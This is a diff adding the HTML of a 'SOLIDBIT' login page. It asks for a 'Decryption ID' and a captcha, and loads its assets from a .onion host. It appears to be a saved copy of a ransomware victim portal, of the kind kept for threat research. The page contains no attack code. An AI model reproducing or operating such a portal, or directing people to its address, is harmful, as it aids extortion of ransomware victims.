@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOLIDBIT LOGIN</title>
+    <link rel="stylesheet" href="http://solidb2jco63vbhx4sfimnqmwhtdjk4jbbgq7a24cmzzkfse4rduxgid.onion/assets/login/flaticon.css">
+    <link rel="stylesheet" href="http://solidb2jco63vbhx4sfimnqmwhtdjk4jbbgq7a24cmzzkfse4rduxgid.onion/assets/login/main.css">
+    <link rel="stylesheet" href="http://solidb2jco63vbhx4sfimnqmwhtdjk4jbbgq7a24cmzzkfse4rduxgid.onion/assets/login/otp.css">
+</head>
+<body>
+
+<div class="ega-otp-layout ega-otp-layout2">
+    <div class="ega-otp-layout-wrap d-flex justify-content-center align-items-center">
+        <div class="ega-otp-form2-content text-center">
+            <h1 class="otp-verification-type"><span style="background-color: #4caf50;color: white;padding-left: 10px;padding-right: 10px">SOLIDBIT</span></h1>
+            <br>
+            <form class="otp-screen" action="/login" method="post">
+                <input type="hidden" name="_token" value="kUzs9r9uhMjZJSUUjASqibTcxxZiKNGUtj20bbWp">
+                <label for="telid">Decryption ID</label>
+                <input id="telid" placeholder="Your decryption id" name="login_key" style="margin-bottom: 25px">
+                <div class="captcha">
+                    <span><img src="http://solidb2jco63vbhx4sfimnqmwhtdjk4jbbgq7a24cmzzkfse4rduxgid.onion/captcha/default?0WnnKmf3" ></span>
+                    <button type="button" class="btn btn-danger" class="reload" id="reload">
+                        &#x21bb;
+                    </button>
+                </div>
+                <div class="form-group mb-4" >
+                    <input id="captcha" type="text" class="form-control" placeholder="Enter Captcha" name="captcha">
+                </div>
+
+
+                <button class="otp-submit-btn" type="submit">Next</button>
+                
+
+            </form>
+            <div class="otp-bottom">
+
+            </div>
+        </div>
+    </div>
+</div>
+<script src="http://solidb2jco63vbhx4sfimnqmwhtdjk4jbbgq7a24cmzzkfse4rduxgid.onion/assets/js/jquery-3.6.0.min.js"></script>
+<script type="text/javascript">
+
+    $('#reload').click(function () {
+        $.ajax({
+            type: 'GET',
+            url: 'reload-captcha',
+            success: function (data) {
+                $(".captcha span").html(data.captcha);
+            }
+        });
+    });
+</script>
+</body></html>
